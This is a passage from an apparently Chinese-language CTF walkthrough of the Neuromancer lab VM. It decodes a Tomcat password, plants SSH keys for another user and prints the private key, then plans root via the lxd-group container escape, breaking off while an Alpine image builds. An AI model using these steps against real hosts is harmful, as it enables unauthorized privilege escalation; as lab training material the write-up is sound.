<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /usr/<span class="built_in">local</span>/tomcat/conf/tomcat-users.xml</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="line">              xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">              xsi:schemaLocation=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="line">              version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">Eng.,</span><br><span class="line"></span><br><span class="line">Tomcat is still using basic auth. I encoded the password so the AI<span class="string">&#x27;s security scans don&#x27;</span>t flag it.</span><br><span class="line"></span><br><span class="line">Is this what Bob keeps talking about, <span class="string">&quot;Security by obscurity?&quot;</span></span><br><span class="line"></span><br><span class="line">Ed Occam//Sys.Engineer I//Night City</span><br><span class="line"><span class="string">&quot;Harry, I took care of it&quot;</span> - Llyod Christmas</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;Lady3Jane&quot;</span> password=<span class="string">&quot;&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;&quot;</span> roles=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">  &lt;role rolename=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;both&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat,role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;role1&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>

<p>因此看来密码已被编码。将其纳入Burp，并在解码（HTML）时得到：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;!Xx3JanexX!&lt;</span><br></pre></td></tr></table></figure>

<p>lady3jane/&gt;!Xx3JanexX!&lt;</p>
<p>ssh连接neuromancer：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -p 34483 lady3jane@192.168.56.110</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">lady3jane@192.168.56.110<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">94 packages can be updated.</span></span><br><span class="line"><span class="string">44 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jan 15 23:19:59 2020 from 192.168.56.102</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ </span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ id</span></span><br><span class="line"><span class="string">uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ whoami</span></span><br><span class="line"><span class="string">lady3jane</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ dir</span></span><br><span class="line"><span class="string">44298  custom-tomcat-chk.sh</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ pwd</span></span><br><span class="line"><span class="string">/home/lady3jane</span></span><br></pre></td></tr></table></figure>

<p>但是很遗憾，它不是任何管理员，也没有任何sudo功能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lady3jane@neuromancer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> lady3jane: </span><br><span class="line">Sorry, user lady3jane may not run sudo on neuromancer.</span><br></pre></td></tr></table></figure>

<p>假设“ta”帐户提到了“group”命令的某些管理功能，让我们尝试一下“ta”帐户的可能性</p>
<h2 id="步骤3：获得TTY-“ta”帐户的SSH密钥路由"><a href="#步骤3：获得TTY-“ta”帐户的SSH密钥路由" class="headerlink" title="步骤3：获得TTY-“ta”帐户的SSH密钥路由"></a>步骤3：获得TTY-“ta”帐户的SSH密钥路由</h2><p>生成密钥集的过程非常简单：</p>
<ul>
<li>cd into /home/ta</li>
<li>运行ssh-keygen。遵循所有默认设置，但选择应用密码短语。密钥存储在/home/ta/.ssh中</li>
<li>将公钥添加到/home/ta/.ssh/authorized_keys文件</li>
<li>找出id_rsa和id_rsa.pub的值，然后将其复制/粘贴到我的攻击box中的相应文件中。还将chmod 400应用于每个文件，否则ssh会抱怨权限，然后完全忽略密钥，这将导致出现不需要的密码提示（我们不知道密码！）</li>
</ul>
<p>生成密钥并将副本放入攻击box中后，即可获得访问权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">ta</span><br><span class="line">$ mkdir .ssh</span><br><span class="line">$ ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x 7 ta   ta   4096 Jan 18 20:57 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Jul  1  2018 ..</span><br><span class="line">-rw-rw-r-- 1 ta   ta    352 Jul  1  2018 ai-gui-guide.txt</span><br><span class="line">-rw------- 1 ta   ta     54 Jul  3  2018 .bash_history</span><br><span class="line">-rw-r--r-- 1 ta   ta    220 May 18  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 ta   ta   3900 May 18  2018 .bashrc</span><br><span class="line">drwx------ 2 ta   ta   4096 May 18  2018 .cache</span><br><span class="line">drwxrwxr-x 3 ta   ta   4096 May 18  2018 .m2</span><br><span class="line">drwxrwxr-x 4 ta   ta   4096 May 18  2018 myWebApp</span><br><span class="line">drwxrwxr-x 2 ta   ta   4096 May 18  2018 .oracle_jre_usage</span><br><span class="line">-rw-r--r-- 1 ta   ta    655 May 18  2018 .profile</span><br><span class="line">drwxr-x--- 2 ta   ta   4096 Jan 18 20:57 .ssh</span><br><span class="line">-rw-r----- 1 ta   ta     82 May 18  2018 velocity.log</span><br><span class="line">-rw------- 1 ta   ta   4538 Jul  1  2018 .viminfo</span><br><span class="line">$ <span class="built_in">cd</span> .ssh</span><br><span class="line">$ ls</span><br><span class="line">$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/ta/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): 123456</span><br><span class="line">Enter same passphrase again: 123456</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/ta/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/ta/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:/gzcDUYz+IUYLOPtla+IXjSlx8Mmfc9cHvH0794Ptys ta@neuromancer</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|       ..        |</span></span><br><span class="line"><span class="string">|      o .+ .     |</span></span><br><span class="line"><span class="string">|     . +o *..  ..|</span></span><br><span class="line"><span class="string">|      . .Oo+   .+|</span></span><br><span class="line"><span class="string">|       .S.@..  .+|</span></span><br><span class="line"><span class="string">|       +.B =.+ oo|</span></span><br><span class="line"><span class="string">|       .=.... = +|</span></span><br><span class="line"><span class="string">|      ...+.  E +o|</span></span><br><span class="line"><span class="string">|     ..   o   .+B|</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">$ ls -la</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">drwxr-x--- 2 ta ta 4096 Jan 18 21:00 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 7 ta ta 4096 Jan 18 20:57 ..</span></span><br><span class="line"><span class="string">-rw------- 1 ta ta 1766 Jan 18 21:00 id_rsa</span></span><br><span class="line"><span class="string">-rw-r----- 1 ta ta  396 Jan 18 21:00 id_rsa.pub</span></span><br><span class="line"><span class="string">$ cp id_rsa.pub authorized_keys</span></span><br><span class="line"><span class="string">$ ls </span></span><br><span class="line"><span class="string">authorized_keys</span></span><br><span class="line"><span class="string">id_rsa</span></span><br><span class="line"><span class="string">id_rsa.pub</span></span><br><span class="line"><span class="string">$ chmod 400 *</span></span><br><span class="line"><span class="string">$ cat authorized_keys</span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpcLl+QjOHvGDqQ9ZPsgT8Rm9VbuZsa0JtUsE59C5feBNUC0uuOME6JSSY+Ci5fXnanOJIFKcNbRnfz0eQ35/FlCQE6TqXW08LROeaz+scppXs9O7wMNkmVrtrjHMIfebEtB9I05DWPpme5GjHE9QerNjE4t8Z6khoqipeQAy2VqYmqU5u8ll2gm3VDNhgUnfGeBwUoQA2Ktj1F9XMaBVgRBytZ86VLW1Be4SLd6rkMhgA/poZQSZGjU1di09Y9VnN/au+PgQQvVvldP2WITAfS4j0rTTF9zz8o+kccWll/CkMjoOBAJB06KBqxg1dnGcMXyEUnTshFidXx2TjBQQx ta@neuromancer</span></span><br><span class="line"><span class="string">$ cat id_rsa.pub</span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpcLl+QjOHvGDqQ9ZPsgT8Rm9VbuZsa0JtUsE59C5feBNUC0uuOME6JSSY+Ci5fXnanOJIFKcNbRnfz0eQ35/FlCQE6TqXW08LROeaz+scppXs9O7wMNkmVrtrjHMIfebEtB9I05DWPpme5GjHE9QerNjE4t8Z6khoqipeQAy2VqYmqU5u8ll2gm3VDNhgUnfGeBwUoQA2Ktj1F9XMaBVgRBytZ86VLW1Be4SLd6rkMhgA/poZQSZGjU1di09Y9VnN/au+PgQQvVvldP2WITAfS4j0rTTF9zz8o+kccWll/CkMjoOBAJB06KBqxg1dnGcMXyEUnTshFidXx2TjBQQx ta@neuromancer</span></span><br><span class="line"><span class="string">$ cat id_rsa</span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">Proc-Type: 4,ENCRYPTED</span></span><br><span class="line"><span class="string">DEK-Info: AES-128-CBC,0A0CA4D74B1C05FCDEC9F8FAE18EFB6D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">w38r/TLFNRXJBCI/BpIUgQcmqZ8tcIyIaOg5gOhBLoKgLhmQ1ghMtBghR/Uu3hY8</span></span><br><span class="line"><span class="string">16Wk4Vk64miWibaNYG4aVz0XOK4Zi6u3slp8KHMZm5OARsnLRfWdBck/VSzqmv0z</span></span><br><span class="line"><span class="string">uI1yl0E3jJyfA+Xlxra9lxKzSi5g4Qw64q22tJzC9bNktAbVCNaV795K7m0TJaXl</span></span><br><span class="line"><span class="string">5SzB6+jagE96PjwT169VyJxX0IpVHIEeVZfkO3QD9e2mcJLgassz3fG+YlU6vQVV</span></span><br><span class="line"><span class="string">O4IZnXu/pPjYSFeLyVwcasHsgWsxqRsPne7J88l8gBVFswFjLVnCLW55i14le1bk</span></span><br><span class="line"><span class="string">82/BHH+3Y6zAkjueFA4/ggFKKU0kRlXQXdFMNhxH9gc3+gANeIK+qXfypx2+3keC</span></span><br><span class="line"><span class="string">d6wplIaFtzt9npQh3vJnXPF4l6dWCOYAK8FqoGgcbB8qDOz5/j1qxHHo3P8mWyVP</span></span><br><span class="line"><span class="string">X0wK7UzwBg8nIe3JjKtFPfSpgiNtNGai5GCvJlt7c9Wtxd1HcIFcUrCDeAb9ijMm</span></span><br><span class="line"><span class="string">zzTLNdkae/677ErzfQfEeA24u21DyQoIP0MUM0ICa3Qjr5uXa1RnNq38pYfi338X</span></span><br><span class="line"><span class="string">kKwHqJQCxm43HLoQIoMQIRYTN49W3wLMdnH7oF40nT6ktJuC9zlzilV+JxcRODgc</span></span><br><span class="line"><span class="string">eUFoKag5y2/wR8yeLeUiDgxUzL441ThkYGa2jaULRoVehDgAUXrQEEkzY/OM8/G1</span></span><br><span class="line"><span class="string">50MJAMEKJU17TDjTtjIy6ymtKPTxohezKvBwjgQmR6eGin32i6iIs38jag8jqape</span></span><br><span class="line"><span class="string">0MIRzOO3gfod8FXaJMp282gebGhLwWeowjogzfyKQzwIQxkldVVOO1caJWuBczNd</span></span><br><span class="line"><span class="string">JMKT7F1zoClpEg9YFyPMnkQtoNwjuGs6KtFgpt5yz/8j5jy0uiSaiLlvrOYtDDli</span></span><br><span class="line"><span class="string">0AEjTlDPbzEQgKhdjdwiPm0ClJoXHIgg35mjwTwfxmFvNL2XJlunm2fDcooDbM3o</span></span><br><span class="line"><span class="string">2KIzsa5kFEFbvPkP1Cym4RrTRkXv55XfRZHBk5/DBICmez6pkaC1A+W0vfyTX70z</span></span><br><span class="line"><span class="string">wJrvoUHdENdQIHESb8hrAmqZXjSNsBB1WEKHcN39v/iufxMMk0Dei2Ca5VgTfyfB</span></span><br><span class="line"><span class="string">lwtrdtV3YPhNT4v+2FhibKIaILIVS0oWU9IAzAHNPMt+GFXo3QRtFJmprJc8AVzf</span></span><br><span class="line"><span class="string">3guFhYesZZVmzNRDcuhZuQmY54YaCc0VFEBLwoaIn5Y33zPO274IICw0IXzm4Nmm</span></span><br><span class="line"><span class="string">QttHWLl9IcbVVOkkmnuvNcKZ8kdcZ24zZGXD+2bV/+VQHFanSXjEDdzeYDUjRiiK</span></span><br><span class="line"><span class="string">va7jEa8wb5/mHOJFRTeYBiuLY1H239HedvycPRfHyA1Hq3q3+7c1JJVxiVdOr3zO</span></span><br><span class="line"><span class="string">gM22fIaExHxjRdf0L06sht1SC9Le4d6oc5mhFjmk4h+DyorOyWuaC8xBUatE+slF</span></span><br><span class="line"><span class="string">OxerKC2CdDFCrx9+8jQmix0KSfePhYC4loiQ+tS6Bp8YtiOGOmlZ+2sCa0wf7inN</span></span><br><span class="line"><span class="string">sOLukUtHENuU720fPxEurnbCDG4QKk4Szvea61UkOrEF15x0PO42YSCz7QtHdLeG</span></span><br><span class="line"><span class="string">hiHhVK28l9FeRekPEdOUou1tjiiVvEUUNi99YJsOroTNfiHy6RjmcA+BWFOIfHrY</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br></pre></td></tr></table></figure>

<p>kali端运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cd .ssh</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">known_hosts</span><br><span class="line">root@kali:~/.ssh<span class="comment"># touch id_rsa</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># nano id_rsa (将ta用户中的id_rsa中的值拷贝进来)</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># chmod 400 *</span></span><br></pre></td></tr></table></figure>

<p>ssh连接，输入密码123456</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa -p 34483 ta@192.168.56.110</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">94 packages can be updated.</span><br><span class="line">44 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Jul  3 21:53:25 2018</span><br><span class="line">ta@neuromancer:~$ id</span><br><span class="line">uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br><span class="line">ta@neuromancer:~$ whoami</span><br><span class="line">ta</span><br></pre></td></tr></table></figure>

<p><font color="red">it works!!!!!!</font></p>
<p>再次执行“groups”命令，然后一分钱掉了……。“ta”不是“admin”组的成员，因此不会成为root用户的即时路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:~$ groups</span><br><span class="line">ta adm cdrom dip plugdev lxd lpadmin sambashare</span><br></pre></td></tr></table></figure>

<p>向前迈进…现在没有真正的意义跳到通过socat选项获得TTY…</p>
<p>当试图root时，通常如下进行：</p>
<ul>
<li>sudo</li>
<li>password</li>
<li>file permissions (suid/guid)</li>
<li>cron作业（通常与错误的文件权限结合使用）</li>
<li>内核漏洞</li>
<li>正在运行的应用程序</li>
<li>文件系统</li>
</ul>
<p>通常，将该列表下移得越远，privesc就越困难。因此，……在用完前两个选项之后，需要进行一些老式枚举。<br>经过一系列的提权的枚举之后，发现了提权1步骤中的提权的exp，44298.c，，，但是……总会有一个“but”！:-)</p>
<h2 id="步骤4：选择提权利用途径"><a href="#步骤4：选择提权利用途径" class="headerlink" title="步骤4：选择提权利用途径"></a>步骤4：选择提权利用途径</h2><p>有许多出色的可用于此计算机的编写，并且毫无例外，它们都采用内核利用选项，因为很正确的选择是最明显的选择。如果需要在检查场景中快速root箱子，那么当然会选择最明显的路线。</p>
<p>除了必须在攻击盒上编译漏洞利用程序（Neuromancer未安装gcc）外，这是一个非常快捷简便的选择。但是抛开任何与CTF/OSCP相关的内容……。在“现实世界”中，可以用来处理关键任务的生产系统呢？内核漏洞可能会使生产箱失效，而根本就不想危及下一步入侵！</p>
<p>但是，还有另一种方法可以使此box成为root，我不禁感到“杂技演员”（机器作者）可能希望将其作为另一种待发现的选择。尽管它可能会吸引蓝团队的注意，但它不太可能引起内核崩溃。那我在说什么呢？可以在以下简单命令中找到线索，以检查“ta”所属的组：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:~$ groups</span><br><span class="line">ta adm cdrom dip plugdev lxd lpadmin sambashare</span><br></pre></td></tr></table></figure>

<p>看到是对lxd的引用,这是Ubunutu的容器技术-Docker的替代方法,我做了一些研究，发现“Booj”写的一篇很棒的文章叫做<span class="exturl" data-url="aHR0cHM6Ly9yZWJvYXJlLmdpdGh1Yi5pby9seGQvbHhkLWVzY2FwZS5odG1s">Privilege Escalation via lxd<i class="fa fa-external-link-alt"></i></span>,根据本文所述，如果安装了lxd且给定用户是lxd组的成员，则它们具有与使用以下命令添加到/etc/sudoers相同的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin ALL=NOPASSWD: ALL</span><br></pre></td></tr></table></figure>

<p>因此，…使用此选项非常忙。</p>
<h2 id="步骤5：准备和使用容器-概述"><a href="#步骤5：准备和使用容器-概述" class="headerlink" title="步骤5：准备和使用容器-概述"></a>步骤5：准备和使用容器-概述</h2><p>我不会深入探讨与创建基于Ubuntu LXC的容器相关的每个小细节。这将在另一篇文章中发表，因为这是一个引人入胜的主题，值得深入探讨，而不是本文讨论的范围。</p>
<p>简而言之，这项工作涉及以下方面：</p>
<ul>
<li>根据获取的信息，设置一个尽可能接近Neuromancer的VM。因此，那将是Ubuntu 16.04。</li>
<li>在新创建的VM上安装lxd。</li>
<li>再次创建一个容器，基于Ubuntu 16.04。我只是想让事情简单一点，就我应该做的最好的猜测。</li>
<li>将该容器导出为tarball并将其转移到我的攻击box中，然后再将其转移到Neuromancer box中。由于先前实现了SOCAT端口转发，因此可以通过scp进行传输。</li>
</ul>
<p>为了清楚起见……在任何时候，都没有允许攻击box位于与Neuromancer相同的物理子网中作弊。所有这些都必须以“艰苦”的方式完成。我应该怎么学？</p>
<ul>
<li>导入lxd容器映像tarball并使其能够安装主机文件系统（是的，Neuromancer！）</li>
<li>在新创建的容器上获得root bash会话并创建一组SSH密钥，这些密钥将被写入Neuromancer上的/root/.ssh（通过容器中的/mnt/root/root/.ssh），并添加公共Neuromancer主机上/root/.ssh/authorized_keys的密钥（通过容器中的/mnt/root/root/.ssh）</li>
<li>将SSH密钥的副本传输到我的攻击Kali中，然后以root用户身份登录（希望如此）。</li>
</ul>
<p>上面的内容很雄心勃勃，但是值得这么做，特别是如果唯一的选择是危险的内核漏洞利用。为了简洁，将重点放在刚刚将容器tarball转移到Neuromancer主机上的那一点上。系好安全带，享受旅程吧！:-)</p>
<h2 id="步骤6-导入容器映像。"><a href="#步骤6-导入容器映像。" class="headerlink" title="步骤6-导入容器映像。"></a>步骤6-导入容器映像。</h2><p>kali端攻击机运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ta@neuromancer:~$ uname -a</span><br><span class="line">Linux neuromancer 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">ta@neuromancer:~$ cat /proc/version</span><br><span class="line">Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018</span></span><br></pre></td></tr></table></figure>

<p>可以看出是64位的linux</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># git clone https://github.com/saghul/lxd-alpine-builder</span></span><br><span class="line">正克隆到 <span class="string">&#x27;lxd-alpine-builder&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 27, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27</span><br><span class="line">展开对象中: 100% (27/27), 完成.</span><br><span class="line">root@kali:~<span class="comment"># cd lxd-alpine-builder/</span></span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">build-alpine  LICENSE  README.md</span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># chmod 777 *</span></span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">build-alpine  LICENSE  README.md</span><br><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># proxychains ./build-alpine -a x86_64</span></span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Determining the latest release... |DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">v3.11</span><br><span class="line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.11/main/x86_64</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Downloading alpine-mirrors-3.5.10-r0.apk</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">Downloading alpine-keys-2.1-r2.apk</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">Downloading apk-tools-static-2.10.4-r3.apk</span><br><span class="line">|DNS-request| dl-cdn.alpinelinux.org </span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249</span><br><span class="line">|D-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.40.249:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’</span><br><span class="line">alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: 成功</span><br><span class="line">Verified OK</span><br><span class="line">Selecting mirror http://dl-8.alpinelinux.org/alpine/v3.11/main</span><br><span class="line">fetch http://dl-8.alpinelinux.org/alpine/v3.11/main/x86_64/APKINDEX.tar.gz</span><br><span class="line">(1/19) Installing musl (1.1.24-r0)</span><br><span class="line">(2/19) Installing busybox (1.31.1-r9)</span><br><span class="line">Executing busybox-1.31.1-r9.post-install</span><br><span class="line">(3/19) Installing alpine-baselayout (3.2.0-r3)</span><br><span class="line">Executing alpine-baselayout-3.2.0-r3.pre-install</span><br><span class="line">Executing alpine-baselayout-3.2.0-r3.post-install</span><br><span class="line">(4/19) Installing openrc (0.42.1-r2)</span><br><span class="line">Executing openrc-0.42.1-r2.post-install</span><br><span class="line">(5/19) Installing alpine-conf (3.8.3-r4)</span><br><span class="line">(6/19) Installing libcrypto1.1 (1.1.1d-r3)</span><br><span class="line">(7/19) Installing libssl1.1 (1.1.1d-r3)</span><br><span class="line">(8/19) Installing ca-certificates-cacert (20191127-r0)</span><br><span class="line">(9/19) Installing libtls-standalone (2.9.1-r0)</span><br><span class="line">(10/19) Installing ssl_client (1.31.1-r9)</span><br><span class="line">(11/19) Installing zlib (1.2.11-r3)</span><br><span class="line">(12/19) Installing apk-tools (2.10.4-r3)</span><br><span 